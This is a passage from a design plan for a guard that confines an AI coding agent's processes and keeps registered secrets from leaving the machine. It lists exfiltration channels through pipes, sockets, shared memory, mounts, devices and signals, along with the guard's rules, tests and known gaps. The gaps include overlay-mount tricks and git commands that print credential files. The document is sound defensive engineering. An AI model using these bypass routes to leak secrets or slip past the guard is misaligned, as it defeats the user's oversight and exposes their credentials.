(raw → refused); `a_readers_child_caught_inside_its_exec_has_its_file_labeled`
(unlabeled → labeled); `a_pipe_written_by_a_child_caught_inside_its_exec_carries_the_taint`
(the sibling's connect went out → refused);
`a_readers_child_whose_exec_does_not_end_refuses_the_raw_open_at_the_bound`
(raw at once → refused at about 2.3 s). Where the guard is root in the
tree's user namespace (the CI kernel lane) the fixtures do not hide from
it: the tests check the verdict there, not the window.

**Utility cost, accepted.** `cat .env | grep FOO`: grep becomes a holder; it
connects nowhere and writes nothing, so nothing changes. `npm ci | tee
build.log`: only when npm holds a secret (under the default wire twin it
holds a placeholder): then `build.log` is labeled. `psql … | less`: `less`'s
history file takes a label. `psql … | python3 analyze.py`: the script is a
holder, so its connections need a binding and its output files are labeled:
that is the point. A pipe in the other direction (`generate | reader`) is not
affected. Cost: one pass over the fd tables of the guard's tree at a taint,
and a read of the caller's own fd table at an untainted process's connect,
send or write-open while any holder lives.

**A channel joined after the taint (§9 R1's socket shapes).** A later tool
call's `curl localhost:3000` against a dev server that had read `.env`, or a
process handed a socket-pair end after the taint, would otherwise receive the
secret and send it anywhere. Both joining events are performed by the guard
under a secret policy and judged before a byte flows: *a holder's accept* of
a connection from a process of the tree (a Unix client; a local TCP client,
found by the connection's two ends in `/proc/net`) makes the client a holder,
swept like a pipe receiver, and resets a client already connected to an
unbound peer (`ECONNABORTED`); *a pass* over `SCM_RIGHTS` of a socket-pair
end, a connected Unix socket or a pipe end joins the receivers to the other
end, or is refused (`EACCES`). A holder's connection to a NAMED server stays
an exit, judged by bindings. Utility cost: a client of a holder is confined
like the holder.

**The agent's own connection to a holder: masked, not refused.** When the
agent process itself connects to a holder (an HTTP MCP server that read
`.env`, a local dev server it fetches with WebFetch), refusing would break
every HTTP MCP server that reads a secret, and making the agent a holder
would refuse its own connections. So:

- *The guard records an agent flow* (`recordAgentFlow`, attested, D9) at a
  holder's accept of a connection the agent dialled (local TCP or the
  holder's named Unix listener), and at the taint-time sweep for a
  connection the agent already held (a keep-alive, whose raw open the sweep
  used to refuse). The record is made before a byte flows; a record that
  fails resets the connection or refuses the raw open. The channel is
  reported closed once no agent process holds it.
- *The model exit folds it* (`agentReceiptTaint`, asked by the Claude proxy
  for every tool result): a result the agent itself produced (not a shell's,
  a file tool's, a harness-local tool's or Mandu's own; an unknown tool
  counts) is masked at the holders' strictest level when its call's window
  (from the proxy's relay to its first ask on the human socket) overlaps an
  agent flow. A call whose relay was never recorded counts every earlier
  flow (fail-closed). One ask covers every result of a request, and the
  arbiter records their first asks in one commit
  (`ProvenanceStore.agentReceiptTaints`, 2026-10-17): a commit per call was a
  WAL sync per call, and a request carrying 82 results on a slow disk took
  longer than the proxy's 5 s deadline, so the proxy refused it (its
  fail-closed 502; CI pipelines 10995 and 11016).
- *The side call*: Claude Code's WebFetch hands the page to a small model
  before the tool result exists; a side call made while a flow overlaps a
  call still out is masked whole (`maskSideCallsAfterAgentFlow`).
- *Codex*: the openai-proxy masks every MCP result whose server is not mapped
  clean while the session holds a raw read (Plan 10 §11.13).

Utility cost: while a connection to a holder is open, every result of the
agent's own network tools is masked (a keep-alive MCP server's `ping` too);
the keep-alive case gains a server whose raw open is now admitted. Not
covered: the agent process relaying the bytes on its own (trusted not to, as
with every tool result it holds raw).

**The three leftovers of the agent's receipt, closed:**

- *Through the session's net-proxy: refused.* A local address `NO_PROXY` does
  not name is reached through the net-proxy, which re-originates the request
  from outside the tree and pools upstream connections, so no record can
  name the receiver. The guard finds the proxy's processes and refuses a
  holder's connection the proxy holds (the accept reset; a server holding one
  when it reads its secret refused the raw open). Utility cost: reach a local
  holder by `localhost` (in `NO_PROXY`), not by a LAN address.
- *The old-kernel degrade.* Where the guard performs no accept (no
  `pidfd_getfd`, before 5.6) the agent's TCP connect to a holder's listener,
  and its connections waiting in a new holder's backlog at the sweep, record
  the agent flow. A record that fails refuses the connect.
- *A FIFO, or a file, the agent itself reads.* The guard records an agent
  flow on a file-like channel at the later of the two opens of a FIFO a
  holder writes and the agent reads (under one gate, so concurrent opens do
  not miss each other), and for a regular file the agent already holds open
  when a holder writes it. Such a flow masks a file tool's result (`Read`,
  `Grep`), and only such a flow does.

**File objects and shared memory (§9 R1's file shapes).** The same rule,
keyed by the OBJECT: a process of the tree that can read a file object (a
reading descriptor, or any mapping) receives what a holder that can write it
puts there. This covers a reader already holding a file a holder then writes
(`tail -f /tmp/x | curl … &` left running by an earlier call), shared memory
(`/dev/shm`, a `MAP_SHARED` mapping, inherited anonymous shared memory, a SysV
segment), and objects with no path to label (an unlinked file, an
`O_TMPFILE`, a memfd) passed or reopened through `/proc/<pid>/fd/N`. Checked
at the taint, at a holder's write-capable open or writable `shmat` (an
unbound connection a reader holds refuses the WRITE), at a holder's
`memfd_create` (P0 1b, 2026-10-07: trapped under a secret policy; for a
holder the guard makes the memfd and marks its key before handing the
descriptor over, so a process that comes to hold it otherwise than as the
holder's child, such as one sharing its descriptor table, is a holder at its
next event; anyone else's runs on at once, and none is refused: V8 and other
JIT runtimes use memfds), at a pass over `SCM_RIGHTS`, and at a later open
or `shmat` of an object a holder marked.
A message queue gives the reader no event before the bytes arrive, so a
holder's queue send (`msgsnd`, `mq_timedsend`) is refused; a send let go
for a process holding no secret keeps that process's taint waiting until
the kernel has copied the buffer (2026-10-07). The reader is made
a holder rather than the write refused, as for pipes (refusing every holder's
write to a file another process holds would refuse a holder's log while
anything tails it). Utility cost: a lock or database file shared read-write
with a holder makes its other users holders; a holder cannot use a message
queue.

**The remaining interprocess channels.** A holder's FIFO write-open whose
only reader is outside the guard's tree is refused, and (2026-10-07) so is
one opened `O_RDWR` with no reader in the tree (the kernel completes it
with none), and one the guard finds read outside the tree beside a reader
inside (every process of the user's not in the tree, by the FIFO's
identity in `/proc/*/fd`).

**A pipe or socket pair read outside the guard's tree (P0 2b,
2026-10-09).** D2 follows a holder's pipe or socket pair to the receivers
in the tree; a receiver OUTSIDE it (a process of the user's that holds the
read end of the holder's pipe, the other end of its socket pair, or reads
a FIFO the holder had open for writing before its taint) is no process the
guard can confine, so the event that would let the bytes flow is refused:
the taint-time sweep (`guard_send::sweep_from`, one scan of `/proc` for
every tree it swept: the raw open, or the accept or pass that joined the
receivers), a pass that hands a holder an end whose other side is held
outside (`guard_flow::pass_flows`), and a holder's `sendmsg` with no
address on a socket pair whose other end reached a process outside since
(`guard_send::prepare`, `guard_flow::outside_pair_receiver`; a clean look
is trusted for one second per pair end, `OUTSIDE_CLEAN_TTL`). The scan is
`pipe_flow::outside_receivers`: every process of the user's other than the
tree and the guard (the tree listed before the scan, and a process the scan
finds outside that list looked at again by its live parent chain,
`guard_flow::in_tree_now`: a child the agent forked meanwhile holds a copy
of every agent descriptor until its exec, and judged by the stale list it
was "a program outside Mandu's watch" and refused a listed reader's raw
open, the call-tree D7 flake of 2026-10-11; an outside process never
joins the tree, so the second look admits none), by the link (`pipe:[ino]`, the pair's `socket:[peer]`
from `sock_diag`) and, for a FIFO, by its identity. Left out: the session's
human plane, the guard's own standard input, output and error, which the
launch handed the tree's root (the reply relay, the terminal, the pipeline
the user started Mandu in); a socket with a NAME on either side (an exit,
or a server's client outside the boundary, §4.9). A process whose
descriptor table the guard cannot read (another user's, or a non-dumpable
one of the same user's such as `ssh-agent`) is not seen, as for a FIFO's
reader (the same open decision). Cost: one scan, about 11 ms on a
development host with 1,600 processes (100 of them the user's, 2,400
descriptors), at each taint, and at most once a second per socket pair a
holder `sendmsg`s on. Not covered: a pipe with both ends outside; a
receiver outside that joins after the look (only a process outside can
make one: a socket cannot be reopened through `/proc`, and a pass from the
tree is judged at its sender); a holder's `write` or `send` (not trapped)
on a pair whose other end left the tree after the sweep. Tests: kernel
`pipe_taint_integration.rs` (P0 2b), the `pipe_flow` units.

A holder's signal with a
payload (`sigqueue`, `pidfd_send_signal` with `siginfo`) to a process without
its secret is refused. A signal's NUMBER is not followed (§4.9): it would make
the receiver of every holder's signal a holder (a supervisor's `SIGTERM`, a
shell's job control).

**Not covered** (stated in `docs/guarantees.md`): a pipe between two
processes outside the guard's tree (and the residuals of P0 2b above); a FIFO reader outside the tree that opens it after a holder's
write-open, or runs as another user (or is a non-dumpable process of the same user,
whose `/proc/<pid>/fd` the guard cannot read: `pipe_flow::fifo_readers`
skips it; counting it as a reader would refuse every holder FIFO write
while ssh-agent runs, so it stays disclosed: the maintainer's decision, 2026-10-09)
beside a reader inside; a FIFO read by a program the agent's file tool runs as a
child (that child is then the reader, D2's).

Tests: `net-supervisor/tests/{pipe_taint,socket_flow,agent_flow,object_flow}_integration.rs`,
the `pipe_flow` and `object_flow` units, `arbiter/test/unit/process-flow-record.test.ts`,
`agent-flow-record.test.ts`, the proxy's `agent-receipt-mask.test.ts`, and
under the real guard, arbiter and AnthropicProxy
`tests/sandbox/guard/socket-flow.test.ts` and `agent-flow.test.ts`.

### 4.6 A written file refers to its sources

```
Label(f written by h) = ref{ d1, d2, … }   the data h held, evaluated as ∩ Release(di) when checked
```

- A derived file can never be released anywhere its sources could not all
  go, so carrying the intersected bindings is not "a machine minting a
  release surface" (`derived-labels.ts`; `docs/formal/guarantees.md` C5).
  That decision refused the **union**; this plan keeps the refusal and
  reverses only the consequence that the copy carries nothing.
- A revoked binding or a raised level on a source reaches every copy at
  once.
- Openers and Trust are not inherited: a copy has no reader list, so every
  program gets its twin until a human names an opener; the program that made
  the copy is not a statement about who may read it.
- The derived path enters the guard's index when it is labeled, and the
  label follows `rename` and `link` (D4).

*Built (2026-10-02).* The one composition of the label stores
(`composedLabel`, `arbiter/policy/label-lookup.ts`, shared by the live lookup
and the discovery worker) evaluates a derived row whose sources are known
against those sources at every lookup:

- **Destinations:** the intersection of each source's current bindings (its
  label's and its registry rows'), the same per-file set
  `taintedProcessBindings` counts for a holder of the source itself.
- **Level:** at least every source's current level; the derived row stays a
  floor (a machine may taint, never declassify).
- **The human decides over it:** an exact human label on the copy decides
  alone; under an ANCESTOR human label (a labelled folder the copy landed
  in) the folder's destinations are intersected with the sources'.
- **Fail-closed:** a row with unknown sources (a high session's write, Plan
  9; an older row) stays bound nowhere. A source that no longer classifies
  secret counts as bound nowhere, not everywhere (stricter than keeping its
  last label, and needs no stored snapshot). A cycle of copies, or a chain
  deeper than eight, is bound nowhere. The row itself stores no binding: the
  machine records where the bytes came from; the release is computed from
  the human's labels on the sources.
- **Residuals (utility, never a leak):** an *Always* on a held open of a copy
  writes an exact `paths:` label that binds nowhere until the human binds
  it (a holder's send of a copy is answered at the copy's sources instead,
  one *Always* per source, §5.4; only a copy of unknown origin gets an exact
  label from there, carrying the host); a copy the catalog matches by name (`.env`, `*.pem`) takes the
  catalog's verdict; a symbol already minted for a copy keeps the bindings
  it was minted with until it is registered again.

Tests: `arbiter/test/unit/derived-label-by-reference.test.ts`,
`launcher/test/derived-label-live.test.sh` (a holder the human allows once
to read a copy, `mdu-holder`, feeds a `curl` that reaches the source's
bound listener and never the unbound one; until `curl` became a printer,
§3 D8, `curl` read the copy itself).

**Synced folders (not built).** A write under a known sync root (Dropbox,
OneDrive, iCloud Drive, Google Drive) is a send to a destination,
`sync:<name>`: the write-open is checked like a `connect()`. The draft's
`stores:` grant (paths where derived copies may land) is dropped: every other
write lands with its label and needs no grant.

**Network and FUSE mounts (built 2026-10-03, §9 R4 (b)).** A write onto a
file system whose writes leave the machine is a send at the VFS with no
`connect()`: NFS, SMB/CIFS, 9p (WSL2's `drvfs` included), Ceph, AFS, the
cluster file systems, a VirtualBox share, and every FUSE file system (sshfs,
rclone, virtiofs, ntfs-3g: a FUSE mount is served by a user-space process,
which may send what it is given anywhere). Such a mount is the destination
`mount:<fstype>:<source>`. A holder's write-capable open of a file on one,
or a create in a directory on one, is refused (`EACCES`) unless every datum
it holds is bound to that destination; the binding is matched by equality,
as a `unix:` one, and a `mount:` binding never reaches the host matcher.
The guard judges the descriptor it opened (`fstatfs`'s magic, and the
mount's `mountinfo` row by `mnt_id`, the tracee's namespace first), never a
path, before the create or the reopen, so a refused create leaves no file
and no name on the mount; it judges again after the open, for an opener that
became a holder meanwhile. Either the magic or the type name saying remote
is remote; neither readable is remote. A process that already writes a file
on such a mount when it reads a secret has the raw open refused (the
taint-time sweep, §4.5's later event). *Utility cost:* a holder writes
nothing under a home or a project on NFS or sshfs until the human binds
the mount; a non-holder writes there as before. `net-supervisor`
`local_exits.rs`; tests: its unit tests, kernel
`local_exits_integration.rs` (M).

*Three leftovers, closed 2026-10-04.* (i) **A stacking file system** says
`overlay` (or `ecryptfs`, `shiftfs`) to `fstatfs` while its writes land on
another mount, so an overlay whose upper layer is on NFS took a holder's
write unjudged. Such a mount is judged where its writes land: an overlay by
its `upperdir=` super option, eCryptfs and shiftfs by their source
directory, read from the mount's `mountinfo` row and resolved in the
guard's view and in the tracee's (`openat2` with `RESOLVE_IN_ROOT` under
its root); each view it resolves in is judged like any destination
(recursively, four deep), and any one remote makes it remote, named by
that mount (so binding the NFS mount admits writes through the overlay). An
overlay with no upper layer takes no write. One whose upper cannot be found
in either view (a relative path, a directory renamed away, a path only the
mounter's namespace has) and aufs (whose branches are not named here) are
remote, named `mount:<fstype>:<source>` of the stack itself. *Whose
account is followed (P0 5d, 2026-10-09).* The `upperdir=` (or source) a
row names is a string the mounter chose, resolved in the mounter's view at
mount time; a tree that can mount (a user namespace of its own, which the
whole-agent wrap does not forbid) could name a path it then lays a local
directory at in its view (a tmpfs of its own over it), or unmount the
remote mount from under the path (the overlay keeps its own reference to
the upper), so that every view resolves the path locally while the writes
land remote. The kernel exposes no identity of the upper beyond that
string, so the guard judges the stack's own identity instead: it follows
the row only when the stack's superblock is mounted in the guard's own
mount namespace (the launcher's, which the tree cannot mount in and into
which no mount of a namespace of the tree's own propagates): the row was
found there by `mnt_id`, or a row there has the same device (`major:minor`,
the superblock, shared by every copy and bind) and type
(`local_exits::stack_known`). There the directory must resolve in the
guard's own view (the tracee's view alone could be the tree's), and the
tracee's view, when it resolves, is judged beside it. A stack the guard's
namespace does not hold is `Lands::Foreign`: remote, named by itself
(`mount:overlay:<source>`), whatever its upper (`local_exits::lands_of`).
*Utility cost:* a holder writes nothing through an overlay the agent's own
programs mounted (a rootless container's native overlay) until bound to
that overlay, even over a local upper, and a binding of the mount its
upper is really on no longer admits it. *Left:* a tree that can mount in
the guard's own namespace (an agent with `CAP_SYS_ADMIN` over it: root on
the host, a privileged container); and lookups (§4.6 *Lookups and read
offsets*) through an overlay whose remote upper's mount is out of the
reader's view are not withheld. (ii) **Names
and attributes.** A holder writes bytes into a mount with no write-open:
the names it makes (`mkdir`, `symlink` and its target text, `link`,
`rename`, `mknod`, a socket's `bind`), the names it removes (`unlink`,
`rmdir`), a length (`truncate`), a mode (`chmod`), an extended attribute
(the `setxattr` family, its name and value), and (2026-10-07) an owner (the
`chown` family) and two timestamps (`utimensat`, `futimens`, x86_64's
`utime`, `utimes`, `futimesat`: about 128 bits a call, on a file the holder
owns, by a read-only descriptor too; `owner_time`). Under every secret
policy the whole name family is trapped (with or without a write-protect
list; the `mkdir`, owner and timestamp families joined it, and `bind` on
2026-10-07), a holder's call is performed on the directory or
file the guard pinned, and that descriptor's mount is judged by the rule
above before anything reaches the server (both sides of a rename or a
link); unbound: `EACCES`, the plan 10 §4.3 event *make or change a name or
an attribute on*. A process holding nothing pays a seccomp round trip per
such call and is answered at once (`mkdir` with no lookup while nobody holds
a secret). (iii) **A descriptor passed over `SCM_RIGHTS`.** A process
holding nothing may open a file on such a mount, or a device, for writing
and pass the descriptor to a holder, which never calls `open`. Every
`sendmsg` is already performed by the guard (`guard_rights::judge_pass`),
which now also judges each passed descriptor that can write: a regular file
on a mount that leaves the machine (its destination, bound or refused) or a
device other than the terminal and the sinks that keep nothing (refused);
a receiver that holds a secret refuses the send. The other order needs no
new trap: a process holding such a descriptor (received, or still queued on
a socket it holds) when it reads a secret has the raw open refused by the
taint-time sweep. In a network namespace of the tree's own (the command
box), whose Unix sockets the guard's `sock_diag` cannot see, such a pass is
refused outright. No kernel lacks a needed trap where a holder can exist:
below 5.6 sends are not trapped, but below 5.14 no open is served raw
(`guard_filter::RAW_OPEN_MIN_KERNEL`). *Utility cost:* a holder makes no
name and changes no attribute on an unbound network or FUSE mount (it
cannot `rm` or `mv` there either); nobody passes it a writable descriptor of
one; in a container whose root is an overlay with its upper outside the
container's view, a holder writes nothing to that root until bound
(`mount:overlay:<source>`), and in a rootless container on `fuse-overlayfs`
nothing until bound already. Tests: `local_exits.rs`, `guard_filter.rs` and
`secret_open.rs` unit tests, kernel `local_exits_integration.rs` (O), (N),
(R), `launcher/test/derived-label-live.test.sh` (1c).

*Lookups and read offsets (built 2026-10-07, the maintainer's decision
"refuse raw if visible").* A holder puts bytes on a mount's server with no
write at all: every name it looks up (a `stat`, an `open` of a missing
name, a `getxattr`, any path walk: up to 255 bytes a component) and the
offsets of its reads there. No seccomp filter can judge every path walk, so
the rule judges the moment a process would become a holder: the guard
withholds a raw open (answers it with the twin, as for a program that is
no reader, and emits *read of … — REAL FILE WITHHELD
(remote-mount-visible: …)*) while a mount that sees lookups is visible in
the opener's mount namespace and is neither bound (`mount:<fstype>:<source>`
in the bindings of everything the opener would hold, by equality, as for a
write; asked of the arbiter after it recorded the open) nor trusted for
lookups in policy.yaml (`remote_mounts.trust_lookups: [{ mount, type }]`,
by mount point and type, the human's law only, a relaxation held like
every other; the launcher hands it to the guard as the policy file's
`trustLookups`). The mounts that count are the network and FUSE types of
the write rule, every FUSE type included, and an automount point (a lookup
under `/net/<host>` resolves and mounts what the name says), except a host
share of the machine's own hypervisor or of WSL (`virtiofs`, `9p` over
`trans=virtio`, `xen` or `fd`, `drvfs`: the server is this machine's host)
and systemd's local automount points (`binfmt_misc`, `/boot`, `/efi`,
`/boot/efi`); a host share stays a destination for a write. An opener
whose table cannot be read, or an arbiter that cannot say the bindings,
gets the twin (fail-closed). The check costs a `stat` of
`/proc/<pid>/ns/mnt` and a `poll` of that namespace's kept `mountinfo`
(`visible_mounts::MountViews`: read once per namespace, read again only
when the poll says the table changed, proc(5)), and an arbiter round trip
only when an untrusted mount is visible. Enforced in the guard, where the
raw open is answered (`guard_kernel::raw_withheld_by_visible_mount`); the
launcher names the visible mounts at launch and `mandu doctor` lists them
with the line to trust each (`launcher/src/remote-mounts.ts`), so a user
whose home is on NFS knows why readers get the placeholder. The
classification is shared by both sides through one table
(`net-supervisor/src/visible_mounts.json`, read by both test suites).
*Residuals:* a trusted mount's server sees the names and offsets; the
mounts are judged in the opener's view when its raw open is answered, so
a mount that appears later (mounted from outside the tree, or propagated
into its namespace) is judged only at the next raw open, not for a holder
that already has the real file; a mount visible only in another process's
view, which a holder reaches through `/proc/<pid>/root` of a process of the
same user or by `setns` into a namespace a sibling made, is not judged; a
holder by inheritance (a pipe receiver, §4.5.1) is judged in its reader's
view. A holder cannot make such a mount itself: FUSE needs `/dev/fuse`
opened for writing (refused, §4.9 device nodes), and the network file
systems cannot be mounted in a user namespace. *Utility cost:* with an NFS
or sshfs home, and on a desktop with GNOME's `gvfsd-fuse` and the document
portal mounted under `/run/user/<uid>`, no reader gets a real file until
the human trusts or binds those mounts. Tests: `visible_mounts.rs` and
`events.rs` unit tests, kernel `local_exits_integration.rs` (V) (with the
fake remote mount: withheld, withheld with the bindings unknown, raw when
bound, raw when trusted with its writes still refused, raw with none, and a
mount made after the guard's first look seen at the next raw open and its
removal too), `arbiter/test/unit/guard-settings.test.ts`,
`launcher/test/unit/remote-mounts.test.ts`,
`tests/stack/remote-mount-trust-parity.test.ts`.

**Another local user (built 2026-10-03, §9 R4 (b)).** Another user's
processes are not interposed, so a labelled file another user can read is a
destination with no gate. The guard, which holds the descriptor, closes
every file a holder writes to other users before the holder gets it: a
create is made with no group or other bits (the asked mode masked, then the
umask), and an existing file's group and other bits are stripped
(`fchmod` on the guard's descriptor). A file a process held open for
writing when it read a secret is narrowed at the taint, on a
`pidfd_getfd` copy of that descriptor (its access mode, type, file system
and mode read from the copy and `fchmod` made on it; until 2026-10-04 the
sweep looked the descriptor up again through its `/proc/<pid>/fd` link,
and a number the process closed and reused meanwhile named another file:
in the kernel tests a concurrent test's protected file, held only through
an `O_PATH` pin, went `0600`); a file it has mapped shared and writable is
narrowed through one `O_PATH` open of its path, only while that path still
names the mapped file (else the raw open is refused). A mode the guard cannot narrow (another user's
file) refuses the open, or the raw open at the taint. Afterwards, under
every secret policy (with or without a write-protect list), a `chmod` that
would give a derived file any group or other bit and a POSIX ACL set on one
are refused, by anyone in the tree; the guard asks the arbiter's derived
rows, and a file it cannot check is refused. Chosen over the arbiter
`chmod`ing the file by path when it records the label (Figure 13's
proposal): the label is recorded while the guard holds the descriptor, so
the guard narrows exactly that file with no rename to race, and a create
never exists with the wider mode. *Not done:* a file the human labels keeps
its mode (it is the human's file, and another user reading it is no flow
the agent caused); a registered secret's mode was already never changed
from the tree (§3 D8's change roles). *Utility cost:* every file a holder
writes is `0600` or `0700` (a build a holder runs is not readable by the
group). Tests: kernel `local_exits_integration.rs` (P),
`launcher/test/derived-label-live.test.sh` (1b) and (4).

### 4.7 Outcomes, approvals and who may change the policy

| Outcome | When |
|---|---|
| **raw** | the sink or opener is in the label |
| **symbol / twin** | a model outside the label sees a symbol; a program that is not an opener sees the twin (or `EACCES` under `others: deny`) |
| **ask** | a destination or synced folder outside the label; a known consumer of a file with no reader list (the Inbox learns openers this way, Plan 10 §11.1) |
| **hard deny** | a model outside the level (any model on `no-model` data, an external model on `local-model` data). No approval changes it; only a level change does |

**Approvals default to once.** An Inbox row offers *Deny*, *Allow once*,
*Allow this session* and *Always*; only *Always* writes to the policy. A click
is not a standing release, an injected agent can generate asks on purpose,
and the dashboard already cites the rubber-stamp rate for permission prompts
(`dashboard.md`).

**The monotonic split holds** (`policy-surface.md §8` §3). Anything that
removes sinks or openers, raises a level or adds a label is a tightening that
any client may apply, Plan 14's generator included. Anything that adds a
binding, an opener or a `Trust` above `secret`, or lowers a level, is a
relaxation that only a human makes, on the human plane. Every key this plan
adds (§5.2) is a relaxation until `policyDelta` classifies it with its proof.

### 4.8 The user's prompt is an object (decision 2026-09-28, narrowed 2026-09-30; SUPERSEDED 2026-10-02)

> **Superseded by Plan 15** ([`confidentiality-plan-15-prompt-filter.md`](./confidentiality-plan-15-prompt-filter.md)).
> The human's prompt is trusted by default; the registered-value scan this
> section proposed became Plan 15's one default filter (action `mask`, with
> a prompt floor), and key shapes, organization patterns and a local
> classifier are opt-in filters.

The record, briefly: the model-API proxies forwarded user-role text raw, so a
registered key pasted into a prompt reached the external model. The decision
of 2026-09-28 was to scan the prompt for registered values and replace each
with the secret's own symbol (stable across resent conversations; the human
still sees the original). Symbolizing spans that merely match a secret
*shape* was withdrawn on 2026-09-30, following Plan 14 §1 (no masking by
shape on the security path) and §7 (no registering found values). The
questions it left (the transcript Claude Code writes to disk, an explicit
opt-out that the agent cannot perform, what the dashboard says) are answered
in Plan 15.

### 4.9 What the model does not cover

Stated so that the soundness claim of §6.3 has a boundary:

- the size of a registered file itself, to a program that gets its twin:
  every stat of the path or the descriptor says the TWIN's size (the bind;
  in the guard-only posture the guard, since 2026-10-04 for an `lstat`
  relative to the cwd too, `confidentiality.md` §7.2a "The size a reader
  sees"). Left: an `lstat` relative to a directory descriptor (`find -size`,
  `du`) in the guard-only posture, which says the real size;
- covert and timing channels, file sizes and names (a directory's name also as
  the working directory a holder's cwd file hands the agent, §3 D4), WHEN a holder exits, and
  the NUMBER of a signal a holder sends (`kill`, `tgkill`: a few bits a
  signal, thousands a second; following it would make the receiver of every
  holder's signal a holder). The exit STATUS is covered (§9 R4): it no longer
  rides beside a masked result, and the parent, the tracer and any waiter
  that may reap a holder are made holders. Left of it: the `exit_code` field
  of a zombie holder's `/proc/<pid>/stat` read from outside its parent's
  tree before the reap, one of the `/proc` covert channels Plan 10 §6
  accepts. Since printers admit nothing (§3 D8; fetchers and byte-identical
  copies of a host printer included) these metadata channels are reachable
  only by vetted readers and whatever reads their output: a vetted reader
  that prints what it reads (a client the human vouched for printing a
  query result; `psql` was one until D8 (12) made it a printer; a pinned script that
  prints, a printer the human pinned that is not byte-identical to one
  installed here); `git` was one until 2026-10-04:
  - **`git`, closed 2026-10-04 by option (a) (§3 D8 (11)).** Recorded as
    the residual it was: `git` is a vetted consumer
    (the consumer table's reader of `.git-credentials`, `.netrc` and,
    through `ssh`, the ssh keys) and not a printer, but several of its
    normal modes print an arbitrary named file: `git diff --no-index
    /dev/null <file>`, `git grep --no-index -h . <file>`, `git config -f
    <file> --list`, `git hash-object -w <file>` then `git show` / `git
    cat-file -p` of the blob (the object takes the derived label, but a
    later `git` of the same call holds what the first held and reads its
    copy raw, D4). So `git` named in a file's `readers:` (or a default
    reader of `.git-credentials` / `.netrc` without the wire release) hands
    the raw bytes to whatever reads its output, the agent's code included.
    The options weighed: (a) make `git` a printer (as the consumer table's reader it
    still gets the twin the wire release serves for `.git-credentials` and
    `.netrc`, so under TLS inspection nothing changes; without it `git
    credential-store` gets the twin and the login fails; `ssh` still reads
    the keys); (b) admit `git` raw only for the subcommands that consume a
    credential (`credential-store get`, `fetch`, `pull`, `push`, `clone`,
    `ls-remote`), by the reported argv (a grammar to keep current with
    git); (c) admit `git` only as the consumer table's reader of its own
    files, which leaves `git diff --no-index` of `.git-credentials` itself
    without the wire release; (d) accept. Decided (the maintainer,
    2026-10-04): (a), the simplest and fail-closed, its cost only in a
    configuration without TLS inspection and in naming `git` for a file it
    does not consume. `git-credential-store` and every builtin are git (a
    link of the one binary: by name or by hash), and git's HTTP transport
    `git-remote-http(s)` is a printer too, as are (2026-10-07) the programs
    git builds on their own that read `.netrc` or send a named file
    (`git-http-fetch`, `git-http-push`, `git-imap-send`,
    `git-http-backend`); §3 D8 (11) has the details;
- **device nodes (enforced 2026-10-03, §9 R4 (b)).** A device is a write
  with no label (a serial port, a printer, a USB device, a disk,
  `/dev/kmsg` which other users read, `/dev/fuse` through which a FUSE
  server answers its readers). A holder's write-capable open of a character
  or block device is refused unless it is the terminal or a sink that keeps
  nothing: `/dev/null`, `/dev/zero`, `/dev/full`, the random devices,
  `/dev/tty`, `/dev/ptmx`, a pseudo-terminal, a virtual console (judged by
  the device numbers, never the path). A process holding such a device open
  for writing when it reads a secret has the raw open refused. No binding
  admits a device. A writable device descriptor passed to a holder over
  `SCM_RIGHTS` is refused at the send (2026-10-04, §4.6). Left: what a
  holder writes to the terminal goes to the human, as it always did;
- **the display server (§9 R4 (b), 2026-10-03: no new rule).** X11 and
  Wayland are Unix sockets (a path, or the abstract `@/tmp/.X11-unix/X<n>`),
  so the clipboard (`xclip`, `wl-copy`) and every window a holder could draw
  are destinations already: a holder reaches only its `unix:` bindings, and
  one already connected to the display when it reads a secret has the raw
  open refused (the sweep). The launcher's Unix allow-list names the
  displays for the interactive agent, which holds only symbols. X11 over TCP
  (`localhost:6000+n`) is an INET destination, refused unless bound. Pinned
  by kernel `local_exits_integration.rs` (X);
- **what the exits that are paths leave (§9 R4 (b))**: the names a holder
  only LOOKS UP on a mount (a `stat`, an `open` of a name that does not
  exist, a `getxattr`: the server sees each name asked for) and the offsets
  of its reads there, on a mount trusted for lookups (policy.yaml
  `remote_mounts.trust_lookups`) or bound; elsewhere they are closed since
  2026-10-07 by withholding the raw open while such a mount is visible
  (§4.6 *Lookups and read offsets*), with that paragraph's residuals (a
  mount that appears after the raw open, one reached only through another
  process's view); and on such a mount the byte ranges of the file locks it
  takes (`fcntl` `F_SETLK`, `flock`: NFS and a FUSE server see them) and the
  `ioctl`s it sends on a FUSE file it has open (a server that implements
  `ioctl` receives each command and its argument), which are not trapped;
  (closed 2026-10-09, P0 5d: an overlay's upper was found by the path the
  mount names, so a tree that can mount could lay a local directory at that
  path in its view while the real upper is remote; now a stack the guard's
  own namespace does not hold is remote, §4.6 (i)) lookups through an
  overlay whose remote upper's mount is out of the reader's view; a tree
  with `CAP_SYS_ADMIN` over the guard's own mount namespace; a descriptor another local user
  opened on a file before a holder appended to it and the guard narrowed it
  (a mode change does not revoke an open descriptor); a synced folder
  (§7 step 12); a FUSE mount the agent's own tree serves (its server is in
  the tree; every file on it is refused to a holder all the same);
- what the guard does not judge at the network exit (`exec-routing.md` §7.5,
  "What remains uncovered"): an inbound connection a holder accepts from
  outside the tree, a Unix socket it connected before the taint, and a
  process forked after the taint that makes no trapped call before its holder
  exits;
- a relay that runs outside the session's trees and was not started by it (a
  daemon already on the host); one the session started is a holder;
- data the human declassifies on purpose (rung 3, *Always*, Plan 15's "let it
  through");
- a secret nobody registered or labeled (Plan 14's scans suggest labels; the
  model enforces only what the law says).

### 4.10 What changed from the 2026-09-28 draft, and why

| Draft | Revised | Why |
|---|---|---|
| `L(d) = Base(level) ∪ readers ∪ bindings ∪ stores`, programs as principals | `Release` names sinks only; `Openers` is separate and does not travel | the tree approximation cannot see which program holds the bytes; a program principal in the travelling label was a claim the OS layer cannot enforce |
| D2 fixed by folding the call tree at `connect()` | the check at the later event (§4.5), with the taint following the descriptor (§4.5.1) | the fold at the sink event depends on which stage the scheduler runs first |
| D4: derived labels copy the intersected readers and bindings | a derived label refers to its sources (§4.6); openers are not inherited | revocation reaches the copies; copying a program's reader right to a new file says nothing a human decided |
| `stores:` grant | dropped; synced folders are destinations | a write that stays on the machine keeps its label and needs no grant; the only write that leaves is a synced one |
| every approval adds to `Grants(d)` | approvals default to once; *Always* only on the human plane | a click is not a standing release; approval fatigue |
| prompt: registered values and catalog shapes | registered values only, then Plan 15 | Plan 14 §1 and §7 |
| `declassify:` beside `readers:` | `output:` on the reader entry | one key per (file, program) pair, where the pin already is |

## 5. How a user writes the policy

The design rule: **most users never write the model down.** They answer
questions it asks, and `policy.yaml` is the record of their answers.

